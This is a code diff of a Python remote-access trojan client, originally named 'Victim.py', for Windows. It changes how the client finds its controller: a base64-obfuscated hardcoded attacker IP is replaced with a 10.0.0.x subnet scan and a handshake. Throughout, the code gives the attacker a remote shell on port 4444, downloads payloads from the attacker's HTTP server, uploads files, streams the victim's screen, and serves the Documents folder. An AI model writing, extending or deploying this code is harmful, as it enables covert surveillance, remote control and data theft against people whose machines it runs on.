@@ -1,4 +1,3 @@
-#Victim.py
 import os
 import socket
 import subprocess
@@ -20,21 +19,25 @@ import numpy as np
 import pyautogui
 import struct
 
+# Global variable to store the valid attacker IP
+valid_attacker_ip = None
 
 class FullFrameStreamer:
     def __init__(self, server_ip, port=5001):
         self.server_ip = server_ip
         self.port = port
         self.quality = 90  # Max JPEG quality
-        self.resolution = (1280, 720)  # Native resolution
+        self.resolution = pyautogui.size()  # Automatically get the current screen resolution
         self.running = False
+        self.sock = None
 
     def connect(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             self.sock.connect((self.server_ip, self.port))
             self.running = True
-            self.stream_thread = threading.Thread(target=self.capture_stream)
+            # Start the streaming loop in a separate thread
+            self.stream_thread = threading.Thread(target=self.capture_stream, daemon=True)
             self.stream_thread.start()
         except ConnectionRefusedError:
             print("Connection failed - ensure Attacker is running")
@@ -58,10 +61,17 @@ class FullFrameStreamer:
 
         except Exception as e:
             print(f"Streaming error: {str(e)}")
-            s.send(f"Streaming error: {str(e)}\n".encode())
         finally:
-            self.sock.close()
+            if self.sock:
+                self.sock.close()
             self.running = False
+
+    def stop(self):
+        """Stop the streaming loop."""
+        self.running = False
+        if self.sock:
+            self.sock.close()
+
 
 # Get the path to the Documents folder
 documents_path = os.path.expanduser('~\\Documents')
@@ -86,15 +96,6 @@ def start_server():
     httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
     print("Server started on port 8080...")
     httpd.serve_forever()
-
-# Obfuscated target IP and port
-encoded_target = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
-#encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
-encoded_port = "NDQ0NA=="        # Base64 encoded "4444"
-
-# Decode the target IP and port
-target_ip = base64.b64decode(encoded_target).decode()
-target_port = int(base64.b64decode(encoded_port).decode())
 
 # User profile directory
 user_profile = os.getenv('USERPROFILE')
@@ -148,35 +149,115 @@ handler = HandlerRoutine(console_handler)
 if not ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True):
     print("Error: Could not set control handler")
 
-#clear console
+# Clear console
 subprocess.run("cls", shell=True)
 
+def validate_attacker(sock):
+    """
+    Validate the attacker by performing a handshake.
+    :param sock: The socket connected to the server.
+    :return: True if the server is the correct attacker, False otherwise.
+    """
+    try:
+        # Send a handshake message
+        handshake_message = "HELLO_ATTACKER"
+        sock.send(handshake_message.encode())
+        
+        # Wait for the server's response
+        response = sock.recv(1024).decode().strip()
+        
+        # Check if the response is correct
+        if response == "HELLO_VICTIM":
+            return True
+    except Exception as e:
+        print(f"Handshake error: {e}")
+    return False
+
+def scan_network(base_ip, port, start=1, end=255):
+    """
+    Scan the network for the correct attacker.
+    :param base_ip: The base IP address (e.g., '10.0.0.')
+    :param port: The port to scan (e.g., 4444)
+    :param start: The starting range of the last octet (e.g., 1)
+    :param end: The ending range of the last octet (e.g., 255)
+    :return: The IP address of the correct attacker, or None if not found.
+    """
+    for i in range(start, end + 1):
+        target_ip = f"{base_ip}{i}"
+        print(target_ip + '\n')
+        try:
+            # Attempt to connect to the target IP and port
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.005)  # Set a timeout for the connection attempt
+            result = s.connect_ex((target_ip, port))
+            
+            if result == 0:  # If the connection is successful
+                print(f"Found active host: {target_ip}")
+                
+                # Validate the attacker
+                if validate_attacker(s):
+                    print(f"Validated attacker at {target_ip}")
+                    s.close()
+                    return target_ip
+                
+            s.close()
+        except Exception as e:
+            print(f"Error scanning {target_ip}: {e}")
+    return None
+
 def connect_to_attacker():
+    global valid_attacker_ip
+
     while True:
         try:
             time.sleep(1)
-            # Create a socket and attempt to connect
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
             
-            # If connection is successful, return the socket
-
-            return s
+            # If a valid IP is already found, use it
+            if valid_attacker_ip:
+                print(f"Reconnecting to saved IP: {valid_attacker_ip}")
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((valid_attacker_ip, 4444))
+                return s, valid_attacker_ip
+            
+            # Scan the network for the correct attacker (only if no valid IP is found)
+            base_ip = "10.0.0."  # Adjust this to match your network
+            target_port = 4444    # Adjust this to match the port you're targeting
+            active_host = scan_network(base_ip, target_port)
+            
+            if active_host:
+                # Save the valid IP
+                valid_attacker_ip = active_host
+                
+                # Create a socket and attempt to connect to the active host
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((active_host, target_port))
+                
+                # Validate the attacker again (just to be safe)
+                if validate_attacker(s):
+                    print(f"Connected to attacker at {active_host}")
+                    return s, active_host
+                else:
+                    print(f"Invalid attacker at {active_host}. Retrying...")
+                    s.close()
+            else:
+                print("No valid attacker found. Retrying...")
+                time.sleep(0.1)
+                
         except ConnectionRefusedError:
             # If connection is refused, retry after a delay
-            
             time.sleep(5)
         except socket.timeout:
             # If the connection times out, retry after a delay
-
             time.sleep(5)
         except Exception as e:
             # Handle other exceptions
-
+            print(f"Connection error: {e}")
             time.sleep(5)
 
-def handle_connection(s):
+def handle_connection(s, active_host):
     global current_directory
+    streamer = None  # Initialize the streamer object
+
     try:
         # Start a shell and communicate through the socket
         while True:
@@ -197,7 +278,7 @@ def handle_connection(s):
                     except Exception as e:
                         output = f"{str(e)}\n"  # Send the error message if the directory change fails
 
-                if command == ("kill"):
+                elif command == "kill":
                     try:
                         subprocess.run("taskkill /F /IM java.exe", shell=True, check=False)
                         subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False)
@@ -206,7 +287,8 @@ def handle_connection(s):
                         os.kill(os.getpid(), signal.CTRL_BREAK_EVENT)
                     except Exception as e:
                         output = f"{str(e)}\n"
-                if command == ("downloads2"):
+
+                elif command == "downloads2":
                     try:
                         user_profile = os.getenv('USERPROFILE')
                         print("User Profile Path:", user_profile)
@@ -226,37 +308,39 @@ def handle_connection(s):
                             print(f"Current Directory: {current_directory}")
                             output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
                     except Exception as e:
-                        output = f"{str(e)}\n"                    
+                        output = f"{str(e)}\n"
 
                 elif command.startswith("download "):
                     # Handle file download
-                    # URL of the file to download
                     file_name = command[9:].strip()
-                    url = 'http://' + target_ip + ':8000/' + file_name  # Change the IP address to the attacker's IP
+                    url = f'http://{active_host}:8000/{file_name}'  # Change the IP address to the attacker's IP
 
                     try:
                         # Send a GET request to the server
                         response = requests.get(url, timeout=5)  # Add a timeout to avoid hanging
 
-                        file_name = command[9:].strip()
                         # Check if the request was successful
                         if response.status_code == 200:
-                        # Save the file locally
+                            # Save the file locally
                             with open(file_name, 'wb') as file:
                                 file.write(response.content)
-                            print("File downloaded successfully as " + file_name)
+                            print(f"File downloaded successfully as {file_name}")
                             output = f"File downloaded: {file_name}\n"
                         else:
                             print(f"Failed to download file. Status code: {response.status_code}")
+                            output = f"Failed to download file. Status code: {response.status_code}\n"
                     except requests.exceptions.RequestException as e:
                         print(f"Error: {e}")
-                        output = f"Error: {e}"
+                        output = f"Error: {e}\n"
 
-                elif command == ("start_stream"):
-                    streamer = FullFrameStreamer('10.0.0.22')  # Replace with actual IP
-                    streamer.connect()
-                    output = str(streamer.resolution[0]) + ":" + str(streamer.resolution[1])
-
+                elif command == "start_stream":
+                    # Start the screen stream in a separate thread
+                    if streamer is None or not streamer.running:
+                        streamer = FullFrameStreamer(active_host)
+                        streamer.connect()
+                        output = str(streamer.resolution[0]) + ":" + str(streamer.resolution[1])
+                    else:
+                        output = "Screen streaming is already running.\n"
 
                 elif command.startswith("upload "):
                     try:
@@ -313,21 +397,21 @@ def handle_connection(s):
                 s.send((output + "\n").encode())  # Add a newline after the output
             except socket.timeout:
                 # Handle socket timeout
-
                 break
             except Exception as e:
                 # Handle other communication errors
-
+                print(f"Error handling command: {e}")
                 break
 
     finally:
-        # Close the socket
+        # Close the socket and stop the streamer if it's running
+        if streamer is not None and streamer.running:
+            streamer.stop()
         s.close()
-
 
 # Main loop
 while True:
     server_thread = threading.Thread(target=start_server, daemon=True)
     server_thread.start()
-    s = connect_to_attacker()  # Connect to the attacker
-    handle_connection(s)       # Handle the connection
+    s, active_host = connect_to_attacker()  # Connect to the attacker
+    handle_connection(s, active_host)       # Handle the connection
